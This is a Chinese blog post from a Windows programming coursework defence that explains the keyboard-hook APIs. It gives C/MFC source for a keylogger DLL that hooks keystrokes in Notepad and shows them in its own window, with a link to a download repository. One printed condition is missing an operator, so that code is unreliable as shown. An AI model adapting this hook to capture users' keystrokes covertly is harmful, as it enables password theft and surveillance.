---
title: 键盘记录器
date: 2017-05-13 21:49:54
tags: [笔记,Windows Hook]
---
## 0x01 前言

Windows核心编程的期末答辩
<!--more-->
## 0x02 相关API

SetWindowsHookEx

将应用程序定义的钩子过程安装到钩子链中的，安装一个挂钩程序来监视系统的某些类型的事件
```c
HHOOK WINAPI SetWindowsHookEx(
  _In_ int       idHook,
  _In_ HOOKPROC  lpfn,
  _In_ HINSTANCE hMod,
  _In_ DWORD     dwThreadId
);
```
参数：
idHook: 要安装的挂钩过程的类型，这里等于WH_KEYBOARD。监视按键消息。
lpfn: 指明窗口准备处理一个消息时系统应该调用的函数地址。
hMod: 指明包含lpfn函数的dll。
dwThreadId: 挂钩过程与之关联的线程的标识符。线程标识符为0，表示挂钩过程应与与调用线程相同的桌面中的所有线程相关联

如果函数执行成功，返回挂钩过程的句柄。失败返回NULL。

KeyboardProc

处理键盘消息的回调函数，原型：
```c
LRESULT CALLBACK KeyboardProc(
  _In_ int    code,
  _In_ WPARAM wParam,
  _In_ LPARAM lParam
);
```
参数：
code：确定如何处理消息的代码。如果代码小于零，挂钩过程必须将消息传递给CallNextHookEx函数，无需进一步处理，并应返回CallNextHookEx返回的值。
wParam：生成按键消息的键的虚拟按键代码
lParam：重复计数，扫描码，扩展密钥标志，上下文代码，先前的密钥状态标志和转换状态标志。

返回值：
如果code参数小于0，则必须返回CallNextHookEx的返回值。
如果code大于或等于零，并且挂接过程没有处理该消息，应该调用CallNextHookEx并返回返回的值;否则其他安装了WH_KEYBOARD钩子的应用程序将不会收到钩子通知，并可能会导致错误的行为。 如果挂钩过程处理了消息，它可能返回一个非零值，以防止系统将消息传递给其他钩链或目标窗口过程。

CallNextHookEx

将钩子信息传递给当前钩子链中的下一个钩子过程。 挂钩过程可以在处理挂钩信息之前或之后调用此函数。
```c
LRESULT WINAPI CallNextHookEx(
  _In_opt_ HHOOK  hhk,
  _In_     int    nCode,
  _In_     WPARAM wParam,
  _In_     LPARAM lParam
);
```
UnhookWindowsHookEx

卸载SetWindowsHook安装的钩子
```c
BOOL WINAPI UnhookWindowsHookEx(
  _In_ HHOOK hhk
);
```
## 0x02 程序编写

首先要写一个dll，SetWindowsHookEx会把dll注入目标进程。
包括一个获取模块句柄的函数
```c
HMODULE WINAPI ModuleFromAddress(PVOID pv)
{
	MEMORY_BASIC_INFORMATION mbi;
	if (::VirtualQuery(pv, &mbi, sizeof(mbi)) != 0)
	{
		return (HMODULE)mbi.AllocationBase;
	}
	else
	{
		return NULL;
	}
}
```
创建钩子
```c
BOOL HookStart()
{
	BOOL bol = 1;
	HookMsg = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, ModuleFromAddress(KeyboardProc), 0);
	if (HookMsg == NULL)
	{
		bol = 0;
	}
	return bol;
}
```
卸载钩子
```c
void HookStop()
{
	UnhookWindowsHookEx(HookMsg);
}
```
处理消息
```c
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	CHAR szBuf[128];
	HDC hdc;
	static int c = 0;
	size_t cch;
	HRESULT hResult;
	char szPath[MAX_PATH] = { 0 };
	char *p = NULL;
	GetModuleFileNameA(NULL, szPath, MAX_PATH);
	p = strrchr(szPath, '\\');
	
	if (nCode >= 0)     
	{
        if (!(lParam & 0x80000000)!_stricmp(p+1,PROCESS_NAME))  
        //代表按键松开，具体参考MSDN
        //这里过滤了一下要记录的程序名，PROCESS_NAME在代码开头被定义为"notepad.exe"
		{
			HWND hWnd = ::FindWindow(NULL, "键盘记录器");
			PostMessage(hWnd, HM_KEY, wParam, lParam);
			//给主窗口发送消息
			//return 1;
			//如果这里注释去掉，将拦截用户键盘消息，直到卸载钩子
		}
	}
	return CallNextHookEx(HookMsg, nCode, wParam, lParam);
}
```
新建MFC工程，主程序无非就是调用dll里面的函数了。注意要在BEGIN_MESSAGE_MAP里添加消息处理ON_MESSAGE(HM_KEY, OnHookKey)
MFC里主要代码如下：
```c
void CMyHookDlg::OnBnClickedButton1()
{
	// TODO: 在此添加控件通知处理程序代码
	BOOL bol;
	bol = HookStart();
	if (!bol)
	{
		AfxMessageBox("安装失败");
	}
}
void CMyHookDlg::OnBnClickedButton2()
{
	// TODO: 在此添加控件通知处理程序代码
	HookStop();
}
LRESULT CMyHookDlg::OnHookKey(WPARAM wParam, LPARAM lParam)
{
	char szKey[80];
	::GetKeyNameText(lParam, szKey, 80);
	HWND hWnd = NULL;
	CString strItem;
	strItem.Format(" 用户按键：%s\r\n", szKey);
	// 添加到编辑框中
	CString strEdit;
	GetDlgItem(IDC_EDIT1)->GetWindowText(strEdit);
	GetDlgItem(IDC_EDIT1)->SetWindowText( strEdit+strItem);
	return 0;
}
```
0x03 下载源码及程序
[下载连接](https://github.com/h0rs3fa11/HOOK-.git)